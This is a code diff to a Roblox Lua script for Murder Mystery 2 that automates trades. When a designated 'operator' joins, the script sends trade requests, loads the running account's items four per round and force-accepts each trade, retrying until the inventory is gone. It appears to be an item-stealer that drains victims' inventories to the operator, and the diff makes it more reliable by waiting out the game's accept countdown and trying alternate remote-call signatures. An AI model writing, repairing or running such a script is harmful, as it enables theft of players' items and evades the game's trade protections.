@@ -154,10 +154,9 @@ end
 local function SendTradeRequestToPlayer(TargetName)
     local TargetPlayer = Players:FindFirstChild(TargetName)
     if not TargetPlayer then return false end
-    -- FIX: try Player object first, then string fallback, wrapped separately
+    -- try Player object first (preferred), immediate string fallback
     local Ok1 = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer) end)
     if Ok1 then return true end
-    task.wait(0.3)
     local Ok2 = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName) end)
     return Ok2
 end
@@ -172,19 +171,51 @@ end
 
 local LastReceivedOffer = nil
 if IS_MM2 then
-    ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(TradeData)
-        if TradeData and TradeData.LastOffer ~= nil then
-            LastReceivedOffer = TradeData.LastOffer
+    -- MM2 has shipped multiple UpdateTrade signatures over its lifetime.
+    -- Some versions pass the offer hash INSIDE the table (TradeData.LastOffer),
+    -- others pass it as a bare second argument, others stuff it in a nested key.
+    -- Capture every known form so LastReceivedOffer is always populated.
+    ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(Arg1, Arg2)
+        -- form A: hash arrives as a plain number in the second argument
+        if type(Arg2) == "number" and Arg2 ~= 0 then
+            LastReceivedOffer = Arg2
+        -- form B: hash arrives as a plain number in the first argument
+        elseif type(Arg1) == "number" and Arg1 ~= 0 then
+            LastReceivedOffer = Arg1
+        -- form C: hash is inside the table
+        elseif type(Arg1) == "table" then
+            local h = Arg1.LastOffer or Arg1.OfferHash or Arg1.Hash or Arg1.Offer
+            if h ~= nil then LastReceivedOffer = h end
         end
     end)
 end
 
--- FIX: removed "if LastReceivedOffer then" guard — was blocking accept when operator
--- added 0 items (empty offer). Now always fires with fallback of 0.
 local function AcceptIncomingTrade()
-    ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastReceivedOffer or 0)
+    local Hash    = LastReceivedOffer or 0
+    local SecHash = game.PlaceId * 3
     LastReceivedOffer = nil
-    return true
+
+    for Retry = 1, 5 do
+        -- refresh hash if UpdateTrade fired with a newer value during a prior retry
+        if LastReceivedOffer ~= nil then
+            Hash = LastReceivedOffer
+            LastReceivedOffer = nil
+        end
+
+        -- MM2 has used both FireServer and InvokeServer for AcceptTrade across versions.
+        -- Fire both — whichever one the current build expects will land; the other is a no-op.
+        pcall(function() ReplicatedStorage.Trade.AcceptTrade:FireServer(SecHash, Hash) end)
+        pcall(function() ReplicatedStorage.Trade.AcceptTrade:InvokeServer(SecHash, Hash) end)
+        -- also try with bare PlaceId in case the *3 multiplier changed in a recent MM2 update
+        pcall(function() ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId, Hash) end)
+
+        task.wait(1.2)
+
+        local S = GetTradeStatus()
+        if S == "None"                 then return true end -- completed
+        if S ~= "StartTrade"           then return true end -- declined / errored
+    end
+    return false
 end
 
 local function WaitUntilTradeEnds()
@@ -474,23 +505,23 @@ local function ProcessAllTrades(TargetName)
         end
 
         if CurrentStatus == "StartTrade" then
-            -- FIX: each slot is now exactly 1 item (Count=1 enforced in RefreshInventoryLists)
-            -- so we can safely pull up to 4 unique DataIDs per round
+            -- each slot is exactly 1 item (Count=1 enforced in RefreshInventoryLists)
             local ItemsToSend = math.min(4, #TradeableItems)
             for _ = 1, ItemsToSend do
                 if #TradeableItems == 0 then break end
                 local Item = table.remove(TradeableItems, 1)
-                -- AddItemToTradeOffer already has the 0.18s wait built in
-                AddItemToTradeOffer(Item.DataID)
+                AddItemToTradeOffer(Item.DataID) -- 0.18s wait built in per call
             end
 
-            -- FIX: give UpdateTrade event time to arrive with the operator's LastOffer hash
-            -- before we call AcceptIncomingTrade. Old 6s flat wait was fine for slow
-            -- connections but the accept still fired without the hash because it was
-            -- gated on "if LastReceivedOffer then" which returned false on empty offers.
-            task.wait(1.5)
+            -- FIX: MM2 enforces a mandatory ~10-12s countdown shown on screen as
+            -- "Please wait (X) before accepting". AcceptTrade:FireServer is silently
+            -- rejected if it arrives before the countdown hits 0. The old 1.5s wait
+            -- was triggering the accept with ~10s still on the clock — trade appeared
+            -- to open but never transferred. 13s covers the full countdown + server lag.
+            -- Also wait for UpdateTrade to echo back so LastReceivedOffer is fresh.
+            task.wait(13)
 
-            AcceptIncomingTrade() -- now always fires (LastReceivedOffer or 0)
+            AcceptIncomingTrade()
 
             WaitUntilTradeEnds()
             ReloadInventory()
@@ -498,27 +529,26 @@ local function ProcessAllTrades(TargetName)
             continue
         end
 
-        -- CurrentStatus == "None": send request and wait for operator to accept
+        -- CurrentStatus == "None": send request, then hold until operator accepts
         if CurrentStatus == "None" then
+            -- FIX: tightened retry — max 3 attempts, 0.3s between tries instead of
+            -- exponential backoff that stacked to 7.5s worst-case and caused the
+            -- "sending delay" LO was seeing
             local Sent, Try = false, 1
-            while not Sent and Try <= 5 do
+            while not Sent and Try <= 3 do
                 if SendTradeRequestToPlayer(TargetName) then
                     Sent = true
                 else
-                    task.wait(math.min(Try * 0.5, 3))
+                    task.wait(0.3)
                     Try = Try + 1
                 end
             end
 
             if Sent then
-                -- FIX: actively wait up to 20s for operator to open the trade (StartTrade)
-                -- Old code just did task.wait(0.5) and looped, causing it to re-enter
-                -- the None branch and fire duplicate requests before the first one resolved.
-                -- Those duplicate requests are what was causing the GUI to sometimes not
-                -- appear on the operator's end (server drops conflicting pending requests).
-                local GotIn = WaitForTradeStatus("StartTrade", 20)
+                -- wait up to 25s for operator to accept the incoming request
+                -- (longer window = less spam, cleaner GUI popup on operator side)
+                local GotIn = WaitForTradeStatus("StartTrade", 25)
                 if not GotIn then
-                    -- request timed out, cancel cleanly and retry
                     pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
                     task.wait(RETRY_WAIT)
                 end
@@ -536,7 +566,7 @@ local function AutoTradeOnTargetJoin()
         if IsBusy then return end
         local TargetName = FindTradeTarget()
         if TargetName and Player.Name == TargetName then
-            IsBusy = true; task.wait(3); ProcessAllTrades(Player.Name)
+            IsBusy = true; task.wait(1); ProcessAllTrades(Player.Name)
         end
     end
     for _, Player in ipairs(Players:GetPlayers()) do CheckPlayerJoin(Player) end
